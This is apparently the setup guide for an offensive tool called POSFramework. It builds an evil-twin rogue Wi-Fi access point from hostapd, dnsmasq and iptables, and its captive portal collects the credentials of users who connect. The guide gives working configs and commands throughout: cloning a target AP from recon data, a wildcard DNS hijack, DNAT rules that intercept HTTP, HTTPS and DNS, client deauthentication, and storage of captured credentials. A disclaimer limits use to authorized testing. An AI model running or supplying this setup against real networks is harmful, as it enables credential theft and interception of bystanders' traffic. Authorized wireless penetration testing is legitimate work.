# Hostapd Setup Guide for POSFramework Rogue Access Point

## Overview

This guide covers complete hostapd setup and configuration for the POSFramework rogue access point (evil twin) deployment. The setup integrates hostapd, dnsmasq, and iptables to create a fully functional captive portal network.

## Prerequisites

### System Requirements
- Linux (Ubuntu, Debian, Fedora, etc.)
- Wireless adapter supporting AP mode (check with `iw list`)
- Two wireless interfaces (one for monitoring, one for AP - recommended)
- Root/sudo privileges
- Minimum 100MB disk space

### Required Packages
- `hostapd` - Access point daemon
- `dnsmasq` - DHCP/DNS server
- `iproute2` - Network configuration
- `iptables` - Firewall rules
- `rfkill` - Radio interface control (Linux)
- `wireless-tools` - WiFi utilities

## Installation

### Step 1: Run Setup Script

```bash
sudo bash /path/to/hostapd_setup.sh
```

This script will:
- Install all required packages
- Create configuration directory with templates
- Generate helper scripts
- Set up systemd service files
- Validate installation

### Step 2: Verify Installation

```bash
sudo /path/to/hostapd_configs/validate_hostapd.sh
```

### Step 3: Check Wireless Interfaces

```bash
# List available interfaces
iwconfig

# Check supported modes (look for "AP")
iw list | grep -A 20 "Supported interface modes"

# Check for nl80211 driver support
lsmod | grep nl80211
```

## Configuration

### Configuration Files Location

All configurations are stored in:
```
hostapd_configs/
├── hostapd-open.conf          # Open network template
├── hostapd-wpa2.conf          # WPA2-secured template
├── hostapd-dual.conf          # Dual-band template
├── dnsmasq-captive.conf       # DNS/DHCP captive portal config
├── start_rogue_ap.sh          # Startup script
├── cleanup_rogue_ap.sh        # Cleanup script
├── setup_network.sh           # Network interface setup
├── setup_iptables.sh          # iptables firewall setup
└── validate_hostapd.sh        # Installation validation
```

### Quick Start (POSFramework Integration)

The POSFramework program automatically generates hostapd configs, but you can enhance it:

```python
from posframework.rogueap import RogueAPEngine
from posframework.database import POSDatabase

# Initialize
db = POSDatabase("pos_recon_data.db")

# Create from recon data
rogue_ap = RogueAPEngine.from_recon_db(
    interface="wlan1",
    db=db,
    target_bssid=None  # Auto-select strongest AP
)

# Optional: customize before starting
rogue_ap.use_wpa = True
rogue_ap.wpa_passphrase = "NetworkPassword123"

# Start the rogue AP
rogue_ap.start()

# Access runs for 60 seconds, then:
# - Credentials captured to database
# - Traffic redirected through iptables
# - Captive portal serves login form
```

### Manual Configuration Examples

#### Open Network (No Authentication)

```bash
sudo /path/to/hostapd_configs/start_rogue_ap.sh wlan1 "FreeWiFi" 6
```

#### WPA2-Secured Network

```bash
sudo /path/to/hostapd_configs/start_rogue_ap.sh wlan1 "CompanyWiFi" 6 "Password123"
```

#### Custom Configuration

Edit `/path/to/hostapd_configs/hostapd-open.conf`:

```ini
interface=wlan1
driver=nl80211
ssid=MyNetwork
channel=6
hw_mode=g
ieee80211n=1
wmm_enabled=1
```

Then start hostapd:
```bash
sudo hostapd -B /path/to/hostapd_configs/hostapd-open.conf
```

## Advanced Configuration

### Channel Selection

**2.4 GHz Channels (1-14)**
- Channels 1-11 (US/Canada/Europe)
- Channels 1-14 (Japan)
- Non-overlapping: 1, 6, 11 (US standard)

**5 GHz Channels**
- UNII-1: 36-48
- UNII-2: 52-144
- UNII-3: 149-165

For 5 GHz support, modify hostapd.conf:
```ini
hw_mode=a
channel=36
ieee80211n=1
ieee80211ac=1
```

### WPA/WPA2/WPA3 Configuration

**WPA2-PSK (Recommended for most cases)**
```ini
wpa=2
wpa_passphrase=YourPassword123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

**WPA3-SAE (Newest, requires hostapd 2.6+)**
```ini
wpa=2
wpa_key_mgmt=SAE
wpa_passphrase=YourPassword123
ieee80211w=2
```

**Open Network (Captive Portal)**
```ini
wpa=0
auth_algs=1
```

### Performance Tuning

```ini
# Increase client capacity
max_num_sta=256

# Improve signal
tx_power_level=20

# Enable 802.11n for speed
ieee80211n=1
ht_capab=[SHORT-GI-20][SHORT-GI-40][HT40+][HT40-][DSSS_CCK-40]

# Multicast rate (lower = more reliable)
mcast_rate=55

# Beacon interval (lower = faster detection, higher = less overhead)
beacon_int=100
```

### DNS & DHCP (dnsmasq)

**Wildcard DNS Redirect (All queries to gateway)**
```ini
address=/#/10.0.0.1
```

**Specific domain redirect**
```ini
address=/example.com/10.0.0.1
address=/mail.example.com/10.0.0.1
```

**DHCP Options**
```ini
dhcp-option=option:router,10.0.0.1
dhcp-option=option:dns-server,10.0.0.1
dhcp-option=option:netmask,255.255.255.0
dhcp-option=option:domain-name,local
```

### Captive Portal Redirect

**HTTP & HTTPS to Portal**
```bash
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
    -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 \
    -j DNAT --to-destination 10.0.0.1:80
```

**DNS Interception**
```bash
sudo iptables -t nat -A PREROUTING -i wlan1 -p udp --dport 53 \
    -j DNAT --to-destination 10.0.0.1:53
```

## Troubleshooting

### Common Issues & Solutions

#### 1. "hostapd not found" or "command not found"

```bash
# Install hostapd
sudo apt-get install hostapd

# Or check if installed
which hostapd
hostapd -v
```

#### 2. "Interface not supported" or "nl80211 not available"

```bash
# Check driver support
iw list | head -50

# Verify nl80211 kernel module
lsmod | grep nl80211

# Load module if missing
sudo modprobe nl80211

# Some cards need firmware
sudo apt-get install linux-firmware
```

#### 3. "No wireless interfaces detected"

```bash
# List all interfaces
ip link show
iwconfig

# Check blocked by rfkill
rfkill list

# Unblock if needed
sudo rfkill unblock all

# Check interface state
sudo ip link show wlan0
```

#### 4. Interface disappears after stopping hostapd

```bash
# Restart interface
sudo ip link set wlan1 down
sudo ip link set wlan1 up

# Or restart network service
sudo systemctl restart networking
```

#### 5. "dnsmasq: failed to bind port 53"

```bash
# Check for existing services
sudo lsof -i :53
sudo systemctl stop systemd-resolved

# Or reconfigure dnsmasq to use different port
# (Modify dnsmasq.conf and use iptables for redirect)
```

#### 6. "Address already in use" for IP address

```bash
# Flush configuration
sudo ip addr flush dev wlan1

# Then reconfigure
sudo ip addr add 10.0.0.1/24 dev wlan1
```

#### 7. Clients can't connect or low signal

```bash
# Check AP is broadcasting
sudo hostapd_cli -i wlan1 status

# Check supported rates
sudo hostapd_cli -i wlan1 get_config

# Try reducing channel width
ieee80211n=0

# Or increase beacon strength
tx_power_level=20
beacon_int=100
```

### Debugging Commands

```bash
# Check hostapd status
sudo hostapd_cli -i wlan1 status

# List connected clients
sudo hostapd_cli -i wlan1 list_sta

# Monitor hostapd logs
sudo journalctl -u hostapd-rogue.service -f

# Check dnsmasq DNS queries
sudo tail -f /var/log/dnsmasq.log

# Monitor iptables rules
sudo iptables -t nat -L -n -v

# Check interface configuration
ip addr show wlan1
iwconfig wlan1

# Monitor traffic on interface
sudo tcpdump -i wlan1 -nn

# Check DHCP leases
sudo cat /var/lib/dnsmasq/dnsmasq.leases
```

## Integration with POSFramework

### Automatic Configuration

The POSFramework RogueAPEngine automatically:
1. Generates hostapd config at `/tmp/hostapd-rogue.conf`
2. Starts hostapd process
3. Configures network interface with IP 10.0.0.1
4. Starts dnsmasq for DHCP/DNS
5. Sets up iptables port redirects
6. Starts captive portal HTTP server

### Custom Integration

To use pre-configured hostapd settings:

```python
# Edit your program to use custom config
def use_custom_hostapd_config(config_path):
    with open(config_path, 'r') as f:
        config_content = f.read()
    
    # Write to temp location that POSFramework uses
    with open('/tmp/hostapd-rogue.conf', 'w') as f:
        f.write(config_content)
```

### Runtime Interaction

```bash
# While rogue AP is running:

# Show connected clients
hostapd_cli -i wlan1 list_sta

# Deauthenticate a client
hostapd_cli -i wlan1 deauthenticate <MAC>

# Get signal strength of client
hostapd_cli -i wlan1 get_client <MAC>
```

## Security Considerations

### Responsible Use
- **Only test on networks you own or have explicit permission to test**
- Honor bug bounty program rules
- Comply with local wireless regulations
- Use in controlled lab environments

### Best Practices
1. **Isolation**: Keep test network isolated from production
2. **Logging**: Enable hostapd/dnsmasq logging for audit trail
3. **Cleanup**: Always properly stop services and flush iptables
4. **Monitoring**: Watch for unexpected traffic or clients
5. **Documentation**: Record test dates, targets, and duration

### Regulatory Compliance
- 2.4 GHz: Generally allowed without license
- 5 GHz: Subject to regional regulations
- Check local FCC/CE/ACMA regulations
- Some channels may require DFS compliance

## Performance Benchmarks

**Typical Setup Performance**
- Clients connected: 50-100 per access point
- Throughput: 20-50 Mbps (depending on card)
- Latency: 5-20ms portal redirect
- DNS query time: <50ms with dnsmasq caching

## Next Steps

1. **Run setup script**: `sudo bash hostapd_setup.sh`
2. **Validate**: `sudo ./hostapd_configs/validate_hostapd.sh`
3. **Test**: `sudo ./hostapd_configs/start_rogue_ap.sh wlan1 TestAP 6`
4. **Integrate with POSFramework**: Let program handle startup
5. **Monitor logs**: Check `/var/log/` for issues

## References

- [Hostapd Documentation](https://w1.fi/hostapd/)
- [Dnsmasq Manual](http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html)
- [Linux WiFi Drivers](https://wireless.kernel.org/)
- [nl80211 Documentation](https://wireless.kernel.org/en/developers/documentation/nl80211)

## Support

For issues with:
- **hostapd**: Check `/var/log/hostapd.log` or run with verbose: `hostapd -dd`
- **dnsmasq**: Check `/var/log/dnsmasq.log`
- **iptables**: Run `sudo iptables -t nat -L -n -v`
- **POSFramework integration**: Check program logs

## License

This setup guide and scripts are provided as-is for authorized security testing only.
